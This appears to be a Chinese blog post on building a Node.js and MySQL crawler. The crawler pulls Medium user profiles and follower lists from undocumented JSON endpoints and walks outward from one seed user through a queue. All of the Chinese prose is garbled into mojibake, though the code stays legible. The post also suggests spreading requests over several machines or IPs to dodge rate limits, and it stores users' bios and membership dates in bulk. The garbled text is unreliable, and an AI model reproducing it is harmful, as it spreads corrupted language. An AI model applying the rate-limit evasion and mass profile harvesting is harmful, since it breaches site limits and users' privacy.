åœ¨å˜—è©¦äº†æŠ“æ–‡ç« åˆ—è¡¨ä¸¦å¤±æ•—ä»¥å¾Œï¼Œæˆ‘æœ‰è©¦éç”¨é¡ä¼¼çš„æ–¹å¼å»æŠ“ followerï¼Œä½†åšåˆ°ä¸€åŠç™¼ç¾é€™æ¨£æŠ“çš„è©±æ•ˆç‡ä¹Ÿå¤ªå·®äº†ï¼Œæ¯æ¬¡æ²å‹•è¼‰å…¥ 25 å€‹ follower çš„è©±ï¼Œ1000 äººå¯æ˜¯è¦æ²å‹• 40 æ¬¡ã€‚
è‡ªå·±å¦‚æœåšä¸å‡ºä¾†çš„è©±ï¼Œç­”æ¡ˆå°±å¾ˆæ˜é¡¯äº†ï¼šGoogleï¼Œå°±æ‹œè¨—ä½ äº†ï¼
ç¬¬å››æ¬¡å˜—è©¦ï¼šGoogle å¤§ç¥ç›´æ¥åœ¨ Google æ‰“ä¸Šé—œéµå­—ï¼šmedium follower apiï¼Œå‡ºç¾çš„ç¬¬ä¸€å€‹æœå°‹çµæœæ˜¯æœ€ç„¡ç”¨çš„å®˜æ–¹ APIï¼Œå¹¾ä¹ä»€éº¼è³‡æ–™éƒ½æ²’çµ¦ï¼Œè€Œä¸”è¦ç”³è«‹é‚„è¦å¯„ä¿¡çµ¦å®¢æœï¼Œæœ‰å¤ éº»ç…©ã€‚
ä½†æ˜¯ç¬¬äºŒå€‹æœå°‹çµæœè®“æˆ‘çœ¼ç›ç‚ºä¹‹ä¸€äº®ï¼Œæ˜¯ä¸€å€‹ gist æª”æ¡ˆï¼šMedium API: get number of followers for User Â· GitHubã€‚
ç¨‹å¼ç¢¼æ‰äº”åè¡Œè€Œå·²ï¼Œå¾ˆçŸ­ï¼Œæƒéä¸€éå¯ä»¥çœ‹åˆ°æœ€é—œéµçš„ä¸€è¡Œï¼š
// BUILD THE URL TO REQUEST FROMfunction generateMediumProfileUri(username) &#123;  return `https://medium.com/@$&#123;username&#125;?format=json`;&#125;

ä»€éº¼ï¼åŸä¾†é‚„æœ‰é€™æ‹›ï¼Œåœ¨ç¶²å€å¾Œé¢åŠ  ?format=json å°±å¯ä»¥æ‹¿åˆ° json æ ¼å¼çš„è³‡æ–™ï¼Œé€™çœŸæ˜¯å¤ªç¥å¥‡äº†ã€‚
æŠŠå¾—åˆ°çš„è³‡æ–™ä¸Ÿåˆ° JSON Formatter ä¹‹å¾Œï¼Œå¯ä»¥çœ‹åˆ°å¤§æ¦‚çš„çµæ§‹ï¼š

åœ¨é€™é‚Šå¯ä»¥æ‹¿åˆ°ä½¿ç”¨è€…çš„å€‹äººè³‡æ–™ä»¥åŠç™¼éçš„ä¸€äº›æ–‡ç« ï¼Œä¹Ÿå¯ä»¥æ‹¿åˆ°æˆ‘å€‘çš„ç›®æ¨™ï¼šfollowerï¼
æˆ‘å€‘é †ä¾¿ä¾†çœ‹ä¸€ä¸‹ä½¿ç”¨è€…è³‡æ–™å¯ä»¥æ‹¿åˆ°äº›ä»€éº¼ï¼š
&quot;user&quot;:&#123;     &quot;userId&quot;:&quot;f1fb3e40dc37&quot;,   &quot;name&quot;:&quot;Huli&quot;,   &quot;username&quot;:&quot;hulitw&quot;,   &quot;createdAt&quot;:1487549030919,   &quot;imageId&quot;:&quot;1*WQyJUJBQpBNIHH8GEWE6Sg.jpeg&quot;,   &quot;backgroundImageId&quot;:&quot;&quot;,   &quot;bio&quot;:&quot;è‡ªå­¸ç¨‹å¼ï¼Œå¾Œä¾†è·‘å»å”¸å“²å­¸ç³»ä½†æ²’å¿µå®Œï¼Œå‰å¾€æ–°åŠ å¡å·¥ä½œäº†å…©å¹´åŠå¾Œæ±ºå®šæ”¾ä¸€å¹´çš„å‡ï¼Œåˆ°è™•æ—…éŠã€‚å–œæ­¡æ•™å­¸ï¼Œç™¼ç¾è‡ªå·±å¥½åƒæœ‰æŠŠäº‹æƒ…è¬›å¾—ç°¡å–®åˆæ¸…æ¥šçš„èƒ½åŠ›ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµå¯ä»¥è®“ä¸–ç•Œæ›´ç¾å¥½ã€‚\bMedium æ–‡ç« åˆ—è¡¨è«‹åƒè€ƒï¼šhttps://aszx87410.github.io/blog/medium&quot;,   &quot;allowNotes&quot;:1,   &quot;mediumMemberAt&quot;:1542441600000,   &quot;isNsfw&quot;:false,   &quot;isWriterProgramEnrolled&quot;:true,   &quot;isQuarantined&quot;:false,   &quot;type&quot;:&quot;User&quot;&#125;

é™¤äº†åŸºæœ¬çš„è‡ªä»‹è·Ÿå§“åä»¥å¤–ï¼Œé‚„å¯ä»¥æ‹¿åˆ°æˆç‚º Medium ä»˜è²»æœƒå“¡çš„æ™‚é–“ä»¥åŠæˆç‚º Medium æœƒå“¡çš„æ™‚é–“ï¼Œé‚„æ»¿æœ‰è¶£çš„ï¼Œé‚„æœ‰ä¸€å€‹ flag ä¹Ÿå¾ˆæœ‰è¶£ï¼šisNsfwã€‚
å”¯ä¸€ç¼ºçš„å°±æ˜¯ follower çš„æ¸…å–®äº†ã€‚
é€™é‚Šæˆ‘å˜—è©¦ç”¨ä¸€æ¨£çš„æ–¹æ³•ï¼Œåœ¨ Medium ç¶²å€å¾Œé¢æ¥äº†åƒæ•¸ï¼šhttps://medium.com/@hulitw/followers?format=jsonï¼Œæ²’æƒ³åˆ°é‚„çœŸçš„æœ‰æ±è¥¿ï¼åœ¨ response è£¡é¢å¯ä»¥æ‰¾åˆ° 10 å€‹ follower çš„è³‡æ–™ã€‚
æœ‰äº†è³‡æ–™ä¹‹å¾Œå°±ç¢ºå®šé€™å€‹ API æ˜¯æœ‰ç”¨çš„ï¼Œå†ä¾†ç›´æ¥è·³åˆ° response æœ€ä¸‹é¢ paging çš„éƒ¨åˆ†ï¼š
&quot;paging&quot;:&#123;     &quot;path&quot;:&quot;https://medium.com/_/api/users/f1fb3e40dc37/profile/stream&quot;,   &quot;next&quot;:&#123;        &quot;limit&quot;:10,      &quot;to&quot;:&quot;10590c54e527&quot;,      &quot;source&quot;:&quot;followers&quot;,      &quot;page&quot;:2   &#125;&#125;

path çš„éƒ¨åˆ†çœ‹èµ·ä¾†æ˜¯å€‹ API ç¶²å€ï¼Œnext æ‡‰è©²æ˜¯åƒæ•¸ï¼Œè©¦è‘—æŠŠé€™äº›åƒæ•¸å¸¶åˆ°ç¶²å€ä¸Šé¢ï¼šhttps://medium.com/_/api/users/f1fb3e40dc37/profile/stream?limit=10&amp;to=10590c54e527&amp;source=followers&amp;page=2 ï¼Œå°±å‡ºç¾äº†åªæœ‰ follower ç›¸é—œçš„è³‡æ–™ï¼

è©¦è‘—æŠŠ limit æ›ä¸€ä¸‹ï¼Œç™¼ç¾æœ€å¤§å€¼æ‡‰è©²æ˜¯ 25ï¼Œä¸€æ¬¡å¯ä»¥æŠ“ 25 ç­†è³‡æ–™ï¼›page æ›ä¸€ä¸‹ä¹‹å¾Œç™¼ç¾æ²’ä»€éº¼ä½œç”¨ï¼Œæ–¼æ˜¯æŠŠ to ä¹Ÿæ”¹ä¸€ä¸‹ï¼Œç™¼ç¾å¯ä»¥æˆåŠŸæŠ“åˆ°æ–°çš„è³‡æ–™ã€‚çœ‹ä¾†åˆ†é æ©Ÿåˆ¶æ˜¯æ¡ç”¨ cursor based çš„ã€‚
åœ¨ç¶“éäº†å¹¾æ¬¡å˜—è©¦ä¹‹å¾Œï¼Œçµ‚æ–¼æ‹¿åˆ°äº†å…©å€‹ API çš„ç¶²å€ï¼Œä¸€å€‹å¯ä»¥ç²å¾—è©³ç´°å€‹äººè³‡æ–™ï¼Œå¦å¤–ä¸€å€‹å¯ä»¥æ‹¿åˆ° follower çš„åˆ—è¡¨ï¼
è³‡æ–™ä¾†æºç¢ºå®šæœ‰äº†ä¹‹å¾Œï¼Œå°±å¯ä»¥ä¾†æ§‹æ€ä¸€ä¸‹çˆ¬èŸ²çš„æ¶æ§‹äº†ã€‚
çˆ¬èŸ²æ¶æ§‹æˆ‘è¦æ€éº¼æ¨£æ‰èƒ½å„˜å¯èƒ½çˆ¬åˆ°æ‰€æœ‰çš„å°ç£å¯«ä½œè€…ï¼Ÿ
é¦–å…ˆç¬¬ä¸€å€‹å•é¡Œæ˜¯æˆ‘å€‘å¿…é ˆæŠŠç¯„åœæ”¾å¤§ä¸€é»ï¼Œå› ç‚ºä¸­æ–‡å¯«ä½œè€…è£¡é¢å¯èƒ½æœ‰é¦™æ¸¯ä¾†çš„æˆ–æ˜¯ä¸­åœ‹ä¾†çš„ï¼Œä½ æ¯”è¼ƒé›£é ç¨‹å¼å»è¾¨åˆ¥åˆ°åº•æ˜¯å“ªè£¡ä¾†çš„ï¼Œå°¤å…¶æ˜¯é¦™æ¸¯è·Ÿå°ç£ï¼Œå› ç‚ºéƒ½ä½¿ç”¨ç¹é«”ä¸­æ–‡ã€‚
ç‚ºäº†ä¸è®“å•é¡Œè®Šå¾—æ›´è¤‡é›œï¼Œæˆ‘å€‘åªè¦èƒ½æŠ“åˆ°ã€Œä¸­æ–‡ä½¿ç”¨è€…å°±å¥½ã€ã€‚
é‚£è¦æ€éº¼æ¨£æ‰èƒ½æŠ“åˆ°æœ€å¤šä¸­æ–‡ä½¿ç”¨è€…ï¼Ÿä¸€å€‹å¾ˆç°¡å–®çš„ç­–ç•¥å°±æ˜¯æˆ‘å€‘é è¨­ä¸­æ–‡ä½¿ç”¨è€…çš„ follower æ‡‰è©²éƒ½æ˜¯ä¸­æ–‡ä½¿ç”¨è€…ï¼Œæ‰€ä»¥æˆ‘å€‘åªè¦å¾æŸå€‹ä½¿ç”¨è€…é–‹å§‹ï¼ŒæŠŠä»–æ‰€æœ‰çš„ follower éƒ½ä¸Ÿé€²ä¸€å€‹ queue è£¡é¢ï¼Œä¸€ç›´æŒçºŒé€™å€‹å‹•ä½œå°±å¥½ã€‚
ç”¨æ–‡å­—ç°¡åŒ–å°±æ˜¯é€™æ¨£ï¼š

å¾ queue è£¡é¢æ‹¿å‡ºä¸€å€‹ä½¿ç”¨è€…
æŠŠä»–çš„è³‡æ–™å¯«é€²è³‡æ–™åº«
æŠŠä»–çš„æ‰€æœ‰ follower ä¸Ÿé€² queue
å›åˆ°æ­¥é©Ÿä¸€

é€™æ¨£å­å°±å¯ä»¥é è‘—ä¸€å€‹ä½¿ç”¨è€…ç„¡é™å»¶ä¼¸å‡ºå»ï¼Œè€Œä¸”ç†è«–ä¸Šä¾†èªªå¯ä»¥æŠ“åˆ°è¶…ç´šå¤šä½¿ç”¨è€…çš„è³‡æ–™ã€‚é€™é‚Šä¹‹æ‰€æœ‰é¸æ“‡ followerï¼ˆè¿½è¹¤æˆ‘çš„äººï¼‰è€Œä¸æ˜¯ followingï¼ˆæˆ‘è¿½è¹¤çš„äººï¼‰ï¼Œæ˜¯è€ƒé‡åˆ°è¿½è¹¤çš„ä½¿ç”¨è€…å¯èƒ½æœƒæœ‰åˆ¥çš„åœ‹å®¶çš„ï¼Œä¾‹å¦‚èªªæˆ‘å¯èƒ½æœƒè¿½è¹¤åœ‹å¤–çš„å·¥ç¨‹å¸«ä¹‹é¡çš„ï¼Œä½†å› ç‚ºæˆ‘ä¸å¯«è‹±æ–‡ï¼Œæ‰€ä»¥åœ‹å¤–çš„å·¥ç¨‹å¸«æ‡‰è©²ä¸æœƒä¾†è¿½è¹¤æˆ‘ã€‚é€™æ¨£çš„è©±å°±å¯ä»¥è®“ä½¿ç”¨è€…ä¾·é™åœ¨ä¸­æ–‡ï¼Œç¬¦åˆæˆ‘å€‘çš„ç›®æ¨™ã€‚
æ¥è‘—å°±æ˜¯ç³»çµ±æ¶æ§‹çš„éƒ¨åˆ†ï¼Œé€™é‚Šä¾æ“šä½ æƒ³é”æˆçš„æ•ˆç‡æœƒæœ‰ä¸åŒç¨®åšæ³•ã€‚
å°æˆ‘ä¾†èªªæ•ˆç‡æœƒæœ€é«˜çš„å°±æ˜¯æ‰¾é‚£ç¨®å¾ˆé©åˆç”¨ä¾†ç•¶ queue çš„ serviceï¼Œä¾‹å¦‚èªª redis ä¹‹é¡çš„ï¼Œç„¶å¾Œè³‡æ–™åº«çš„éƒ¨åˆ†å¯ä»¥é¸ç”¨ MySQL æˆ–ä»»ä½•ä½ ç†Ÿæ‚‰çš„è»Ÿé«”ã€‚é€™æ¨£å­çš„å¥½è™•æ˜¯ä½ å¯ä»¥é–‹ä¸åŒæ©Ÿå™¨ï¼Œç„¶å¾Œæ¯ä¸€å°æ©Ÿå™¨éƒ½æ˜¯ä¸€å€‹ workerï¼Œä¾‹å¦‚èªªä½ é–‹äº”å°æ©Ÿå™¨ï¼Œå°±æœƒæœ‰äº”å€‹ worker ä¸€ç›´å¾ queue è£¡é¢æ‹¿æ±è¥¿å‡ºä¾†ä¸¦ä¸”æŠŠ follower ä¸Ÿé€²å»ã€‚
é€™é‚Šä¹‹æ‰€ä»¥é–‹å¾ˆå¤šå°æ©Ÿå™¨è€Œä¸æ˜¯é–‹å¾ˆå¤š thread æˆ– processï¼Œæ˜¯å› ç‚º rate limiting çš„å•é¡Œã€‚ä¸€èˆ¬ API éƒ½æœƒæœ‰æµé‡é™åˆ¶ï¼Œä½ å¦‚æœåŒä¸€å€‹ IP ç™¼å¤ªå¤š request æœƒè¢« ban æ‰æˆ–è€…æ˜¯ä¸€æ®µæ™‚é–“æ‹¿ä¸åˆ° responseï¼Œæ‰€ä»¥é–‹å†å¤š process è·Ÿ thread éƒ½æ²’æœ‰ç”¨ï¼Œåªèƒ½é–‹ä¸åŒæ©Ÿå™¨ä¾†è§£æ±ºï¼ˆæˆ–åªè¦æœ‰è¾¦æ³•æ› IP çš„è©±å°±å¯ä»¥ï¼‰ã€‚
å¾Œä¾†å› ç‚ºæˆ‘æ²’æœ‰å¾ˆåœ¨ä¹æ•ˆç‡è€Œä¸”æ‡¶å¾—é–‹å¾ˆå¤šæ©Ÿå™¨ï¼Œæ‰€ä»¥åªæ‰“ç®—é–‹ä¸€å°è®“ä»–æ…¢æ…¢æŠ“ã€‚å¦‚æœåªæœ‰ä¸€å€‹ worker çš„è©±ï¼Œqueue çš„éƒ¨åˆ†ä¹Ÿå¯ä»¥ç°¡å–®åšä¸€ä¸‹ï¼Œé€™é‚Šæˆ‘å°±ä¹Ÿç”¨ MySQL ä¾†å¯¦åšç°¡å–®çš„ queueï¼Œè®“æ•´å€‹çˆ¬èŸ²çš„æ¶æ§‹è®Šå¾—å¾ˆç°¡å–®ã€‚
æˆ‘å€‘å¯ä»¥ä¾†çœ‹ä¸€ä¸‹è³‡æ–™åº«çš„æ¶æ§‹ï¼š
Users


id
userId
username
name
bio
follower
fr
mediumMemberAt
createdAt



è‡ªå¢ID
ä½¿ç”¨è€… ID
å‰é¢åŠ ä¸Š @ å°±æ˜¯ profile ç¶²å€
ä½¿ç”¨è€…åç¨±
è‡ªä»‹
è¿½è¹¤äººæ•¸
åˆ†é¡
æˆç‚ºä»˜è²»æœƒå“¡çš„æ™‚é–“
åŠ å…¥æœƒå“¡çš„æ™‚é–“


Queue


id
userId



è‡ªå¢ID
ä½¿ç”¨è€… ID


ç¨‹å¼çš„åŸ·è¡Œæµç¨‹æ˜¯é€™æ¨£çš„ï¼š

å¾ Queue è£¡é¢æ‹¿å‡ºä¸€å€‹ userId
å¦‚æœ userId å·²å­˜åœ¨ Usersï¼Œå›åˆ°æ­¥é©Ÿä¸€
æŠŠä»–çš„è³‡æ–™å¯«é€² Users
æŠŠä»–çš„æ‰€æœ‰ follower ä¸Ÿé€² Queue
å›åˆ°æ­¥é©Ÿä¸€

å¾ queue æ‹¿å‡ºä¾†çš„æ™‚å€™å…ˆç¢ºä¿æ²’æœ‰çˆ¬éé€™å€‹ä½¿ç”¨è€…ï¼Œæœ‰çš„è©±å°±è·³éï¼Œç„¶å¾ŒæŠŠæ‰€æœ‰è¿½è¹¤è€…å†ä¸Ÿåˆ° queue è£¡é¢ï¼Œé€™æ¨£ç¨‹å¼å°±æœƒä¸€ç›´è·‘ï¼Œç›´åˆ° queue è£¡é¢æ²’æœ‰æ±è¥¿ç‚ºæ­¢ã€‚
æ¶æ§‹è¨­è¨ˆå¥½ä¹‹å¾Œï¼Œå°±å¯ä»¥ä¾†é–‹å§‹ coding å•¦ï¼
ç¬¬ä¸€ç‰ˆçˆ¬èŸ²é¦–å…ˆæˆ‘å€‘éœ€è¦æœ‰ä¸€å€‹ queueï¼Œèƒ½å¤  push è·Ÿ popï¼Œé‚„è¦èƒ½ç¢ºå®šç¾åœ¨æ‹¿çš„ userId æ˜¯ä¸æ˜¯å·²ç¶“çˆ¬éäº†ã€‚é€™å€‹å¾ˆé©åˆç”¨ class ä¾†å¯¦ä½œï¼š
class Queue &#123;  constructor(conn) &#123;    this.conn = conn  &#125;    get() &#123;    return new Promise((resolve, reject) =&gt; &#123;      this.conn.query(&#x27;SELECT userId from Queues limit 1&#x27;, (error, results) =&gt; &#123;        if (error) &#123;          console.log(error)          return reject(error)        &#125;        if (results.length !== 1) &#123;          return resolve(null)        &#125;        const data = results[0]        this.conn.query(&#x27;DELETE from Queues where userId=?&#x27;, [data.userId], (err, results) =&gt; &#123;          if (error) &#123;            console.log(error)            return reject(error)          &#125;          return resolve(data.userId)        &#125;)      &#125;);    &#125;)  &#125;    check(uid) &#123;    return new Promise((resolve, reject) =&gt; &#123;      this.conn.query(&#x27;SELECT userId from Users where userId=?&#x27;, [uid], function (error, results) &#123;        if (error) &#123;          return reject(error)        &#125;        if (results.length &gt; 0) &#123;          return resolve(false)        &#125;        return resolve(true)      &#125;);    &#125;)  &#125;    push(list) &#123;    return new Promise((resolve, reject) =&gt; &#123;      const values = []      for (let item of list) &#123;        values.push([item])      &#125;      this.conn.query(`        INSERT IGNORE INTO Queues (userId) VALUES ?`, [values], (err) =&gt; &#123;          if (err) &#123;            // console.log(err)          &#125;          resolve()        &#125;      )    &#125;)  &#125;&#125;

æœ‰äº† queue ä»¥å¾Œå¯ä»¥ä¾†å¯«ä¸»è¦é‚è¼¯ï¼Œä¸»ç¨‹å¼çš„æ¶æ§‹æœƒé•·é€™æ¨£ï¼š
var connection = mysql.createPool(&#123;  connectionLimit : 10,  host     : process.env.host,  user     : &#x27;&#x27;,  password : &#x27;&#x27;,  database : &#x27;medium&#x27;,  charset: &#x27;utf8mb4&#x27;&#125;)async function main() &#123;  const queue = new Queue(connection)    // ä¸æ–·å¾ queue æ‹¿æ±è¥¿å‡ºä¾†  while(true) &#123;    const userId = await queue.get()    if (!userId) &#123;      console.log(&#x27;no data from queue, end&#x27;)      break;    &#125;      // çœ‹çœ‹æ˜¯å¦å·²ç¶“çˆ¬éï¼Œçˆ¬éå°±è·³æ‰    const check = await queue.check(userId)    if (!check) &#123;      continue    &#125;      // æ‹¿ userId åšä½ æƒ³åšçš„äº‹    console.log(&#x27;uid:&#x27;, userId)  &#125;&#125;

æ¥è‘—åªè¦å¯¦ä½œä»¥ä¸‹å…©å€‹åŠŸèƒ½å°±å¥½ï¼š

æŠ“å–ä½¿ç”¨è€…è³‡æ–™
æŠŠä½¿ç”¨è€…è³‡æ–™å¯«é€²è³‡æ–™åº«
æŠŠ follower ä¸Ÿå› queue

ç”±æ–¼ Medium API çš„ response éƒ½æœƒæœ‰ä¸€å€‹é˜² json hijacking çš„é–‹é ­ï¼Œå› æ­¤æˆ‘å€‘å¯ä»¥åŒ…è£ä¸€å€‹å‡½å¼å°ˆé–€ä¾† parse API çš„ responseï¼š
async function getMediumResponse(url) &#123;  try &#123;    const response = await axios.get(url)    const json = JSON.parse(response.data.replace(&#x27;])&#125;while(1);&lt;/x&gt;&#x27;, &#x27;&#x27;))    return json  &#125; catch(err) &#123;    return null  &#125; &#125;

æ¥è‘—å°±å¯ä»¥å¯«å…©å€‹ functionï¼Œä¸€å€‹æŠ“ä½¿ç”¨è€…è³‡æ–™ï¼Œä¸€å€‹æŠ“ follower è³‡æ–™ï¼ˆæœ‰å‡ºç¾ _ çš„éƒ½æ˜¯ lodash çš„ functionï¼‰ï¼š
async function getUserInfo(uid) &#123;  const url = `https://medium.com/_/api/users/$&#123;uid&#125;/profile/stream`  const json = await getMediumResponse(url)  if (!json) &#123;    return &#123;&#125;  &#125;  const userId = _.get(json, &#x27;payload.user.userId&#x27;)  const follower = _.get(json, `payload.references.SocialStats.$&#123;userId&#125;.usersFollowedByCount`, 0)    return &#123;    followerCount: follower,    userId: userId,    name: _.get(json, &#x27;payload.user.name&#x27;),    username: _.get(json, &#x27;payload.user.username&#x27;),    bio: _.get(json, &#x27;payload.user.bio&#x27;),    mediumMemberAt: _.get(json, &#x27;payload.user.mediumMemberAt&#x27;),    isWriterProgramEnrolled: _.get(json, &#x27;payload.user.isWriterProgramEnrolled&#x27;),    createdAt: _.get(json, &#x27;payload.user.createdAt&#x27;),  &#125;&#125;async function getFollowers(uid, to) &#123;  let url = `https://medium.com/_/api/users/$&#123;uid&#125;/profile/stream?source=followers&amp;limit=200`  if (to) &#123;    url += &#x27;&amp;to=&#x27; + to  &#125;  const json = await getMediumResponse(url)  if (!json) &#123;    return &#123;&#125;  &#125;  const followers = _.keys(json.payload.references.Social) || []  const nextTo = _.get(json, &#x27;payload.paging.next.to&#x27;)  return &#123;    followers,    nextTo  &#125;&#125;

åŸºæœ¬ä¸Šéƒ½æ˜¯ call API ä¹‹å¾Œç¨å¾®è™•ç†ä¸€ä¸‹è³‡æ–™ï¼Œç„¶å¾ŒæŠŠæˆ‘å€‘é—œæ³¨çš„æ±è¥¿å‚³å›å»ã€‚
ä¸Šé¢æˆ‘å€‘åªå¯¦åšäº†ã€ŒæŠ“ä¸€æ¬¡ followerã€çš„ functionï¼Œæ‰€ä»¥æœ€å¾Œé‚„è¦å†å¯¦ä½œä¸€å€‹ã€ŒæŠ“å…¨éƒ¨ follower ä¸¦ä¸”ä¸Ÿé€² queueã€çš„ functionï¼š
async function getAllFollowers(uid, queue) &#123;  const followers = []  let to = undefined  while (true) &#123;    const data = await getFollowers(uid, to)    if (!data) &#123;      break;    &#125;    followers.push(...data.followers)    to = data.nextTo    console.log(uid, &#x27;fetching...&#x27;, followers.length)    if (data.followers.length === 0 || !to) &#123;      break;    &#125;    await queue.push(data.followers)  &#125;  return followers&#125;

é€™å€‹å‡½å¼æœƒä¸æ–·å»æŠ“ follower å‡ºä¾†ä¸¦ä¸Ÿé€² queueï¼Œä¸¦ä¸”å°å‡ºç¾åœ¨ç¸½å…±æŠ“äº†å¹¾ç­† follower çš„è³‡æ–™ï¼Œå…¨éƒ¨æŠ“å®ŒæœƒæŠŠæ‰€æœ‰çš„ follower å›å‚³å›å»ï¼ˆæœƒå›å‚³æ˜¯å› ç‚ºä¸€é–‹å§‹æˆ‘æ˜¯å…¨éƒ¨æŠ“å®Œæ‰ä¸€æ¬¡å¯«é€² queueï¼Œä½†å¾Œä¾†ç™¼ç¾æ¯”è¼ƒæ²’æ•ˆç‡ï¼Œæ‰€ä»¥æ”¹æˆç¾åœ¨é€™æ¨£æŠ“ä¸€æ¬¡å°±å¯«ä¸€æ¬¡ï¼‰ã€‚
æœ€å¾Œæ˜¯æŠŠä½¿ç”¨è€…è³‡æ–™å¯«é€²å»è³‡æ–™åº«çš„ç¨‹å¼ç¢¼ï¼š
function format(time) &#123;  if (!time) return null  return moment(time).format(&#x27;YYYY-MM-DD HH:mm:ss&#x27;)&#125;  function saveUserInfo(conn, info) &#123;  conn.query(`    INSERT INTO Users    (      userId, username, name, bio, follower,      mediumMemberAt, createdAt, isWriterProgramEnrolled    ) VALUES ?`, [[[      info.userId, info.username, info.name, info.bio, info.followerCount,      format(info.mediumMemberAt), format(info.createdAt), info.isWriterProgramEnrolled    ]]], (err) =&gt; &#123;      if (err) &#123;        // console.log(err)      &#125;    &#125;  )&#125;

æŠŠé€™å¹¾å€‹æ ¸å¿ƒåŠŸèƒ½çš„ function å¯«å®Œä»¥å¾Œï¼Œåªè¦ä¿®æ­£ä¸€ä¸‹æˆ‘å€‘çš„ä¸»ç¨‹å¼ï¼Œå°±å¯ä»¥æŠŠæ•´å€‹çˆ¬èŸ²å®Œæˆäº†ï¼š
async function main() &#123;  const queue = new Queue(connection)    while(true) &#123;      // 1. å¾ Queue è£¡é¢æ‹¿å‡ºä¸€å€‹ userId    const userId = await queue.get()    if (!userId) &#123;      console.log(&#x27;no data from queue, end&#x27;)      break;    &#125;      // 2. å¦‚æœ userId å·²å­˜åœ¨ Usersï¼Œå›åˆ°æ­¥é©Ÿä¸€    const check = await queue.check(userId)    if (!check) &#123;      continue    &#125;      console.log(&#x27;uid:&#x27;, userId)    try &#123;      const info = await getUserInfo(userId)            // å¦‚æœæ²’æŠ“åˆ°è³‡æ–™æœ‰å¯èƒ½æ˜¯è¢«æ“‹äº†ï¼Œå…ˆåœå€‹ 3 ç§’      if (!info.userId) &#123;        console.log(&#x27;sleep...&#x27;)        await sleep(3000)      &#125;        // 3. æŠŠä»–çš„è³‡æ–™å¯«é€² Users      saveUserInfo(connection, info)        // 4. æŠŠä»–çš„æ‰€æœ‰ follower ä¸Ÿé€² Queue      if (info.followerCount &gt; 0) &#123;        // æŠŠ followers æ”¾åˆ° queue ä¸¦å°å‡ºç¸½å…±å¹¾ç­†è³‡æ–™        const followerList = await getAllFollowers(userId, queue)        console.log(&#x27;Add &#x27; + followerList.length + &#x27; into queue.&#x27;)      &#125;    &#125; catch(err) &#123;      // æœ‰éŒ¯èª¤å°±å…ˆç¡å€‹ 3 ç§’      console.log(&#x27;error...sleep&#x27;)      await sleep(3000)    &#125;   &#125;  &#125;

ä¸Šé¢å°±æ˜¯æˆ‘å€‘æŒ‰ç…§å…ˆå‰çš„é‚è¼¯å¯«å‡ºä¾†çš„ç¨‹å¼ç¢¼ï¼š

å¾ Queue è£¡é¢æ‹¿å‡ºä¸€å€‹ userId
å¦‚æœ userId å·²å­˜åœ¨ Usersï¼Œå›åˆ°æ­¥é©Ÿä¸€
æŠŠä»–çš„è³‡æ–™å¯«é€² Users
æŠŠä»–çš„æ‰€æœ‰ follower ä¸Ÿé€² Queue
å›åˆ°æ­¥é©Ÿä¸€

ä¸éé€™é‚Šé¡å¤–åŠ äº†ä¸€å€‹é‚è¼¯æ˜¯ç•¶å‘¼å« API æœ‰å•é¡Œçš„æ™‚å€™ï¼Œå°±å…ˆæš«åœ 3 ç§’é˜ï¼Œé€™æ¨£æ˜¯ç‚ºäº†é˜²æ­¢è¢« rate limiting æ“‹åˆ°ã€‚ä½†é€™å€‹æ©Ÿåˆ¶åšçš„ä¸æ˜¯å¾ˆå¥½ï¼Œå› ç‚ºæ²’æœ‰ retryï¼Œæ‰€ä»¥ä¸€ä½†ç™¼ç”ŸéŒ¯èª¤ï¼Œé€™å€‹ userId å°±è¢«è·³éäº†ã€‚
ç•¶åˆçš„æƒ³æ³•æ˜¯åªè·³éä¸€å€‹ userId ç„¡å‚·å¤§é›…ï¼Œç•¢ç«Ÿ queue è£¡é¢å¯èƒ½æœ‰åè¬ç­†çš„ userIdï¼Œè€Œä¸”å°±ç®—è·³éï¼Œä¹‹å¾Œé‚„æ˜¯æœ‰å¯èƒ½å†è¢«ä¸Ÿåˆ° queue è£¡é¢ï¼Œæ‰€ä»¥ä¸åš retry çš„æ©Ÿåˆ¶ä¹Ÿç„¡æ‰€è¬‚ã€‚
ä¸Šé¢çš„ç¨‹å¼ç¢¼å…¨éƒ¨çµ„è£èµ·ä¾†ï¼Œå°±æ˜¯ç¬¬ä¸€ç‰ˆçˆ¬èŸ²çš„é››å½¢äº†ã€‚é‹ä½œçš„ ok æ²’ä»€éº¼å•é¡Œï¼Œå°±åªæ˜¯é€Ÿåº¦æ¯”è¼ƒæ…¢è€Œå·²ã€‚è€Œä¸” queue å¢é•·çš„é€Ÿåº¦æ¯”æƒ³åƒä¸­é©šäººï¼Œæˆ‘è·‘äº†ä¸€å€‹æ™šä¸Š queue å¤§æ¦‚å°±å¤šäº†åè¬ç­†è³‡æ–™ï¼Œè€Œ users è£¡é¢å»åªæœ‰å››äº”åƒç­†è€Œå·²ã€‚
ä¸éåœ¨è·‘äº†ä¸€å€‹æ™šä¸Šä¹‹å¾Œï¼Œæˆ‘ç™¼ç¾äº†ä¸€å€‹è‡´å‘½çš„éŒ¯èª¤ã€‚
ç¬¬äºŒç‰ˆçˆ¬èŸ²ï¼šåˆ¤æ–·ä¸­æ–‡é€™å€‹è‡´å‘½çš„éŒ¯èª¤å°±æ˜¯ç•¶åˆçš„é è¨­ï¼šã€Œä¸­æ–‡ä½œè€…çš„ follower éƒ½æ˜¯ä¸­æ–‡ä½œè€…ã€æ˜¯æœ‰å•é¡Œçš„ï¼Œè€Œä¸”ä»”ç´°æƒ³æƒ³æœƒç™¼ç¾é€™å€‹é è¨­çš„ç¢ºå¾ˆä¸å¯é ã€‚
æ‰€ä»¥è·‘äº†ä¸€å€‹æ™šä¸Šçš„çˆ¬èŸ²ï¼Œæˆ‘ç™¼ç¾è³‡æ–™åº«è£¡é¢å¤šäº†ä¸€å¤§å †å¤–åœ‹ä½¿ç”¨è€…ã€‚è€Œä¸”ä¸€ä½†å¤šäº†ä¸€å€‹ï¼Œä½ çš„ queue è£¡é¢å°±æœƒå‡ºç¾ä¸€å¤§å †çš„å¤–åœ‹ä½¿ç”¨è€…ã€‚
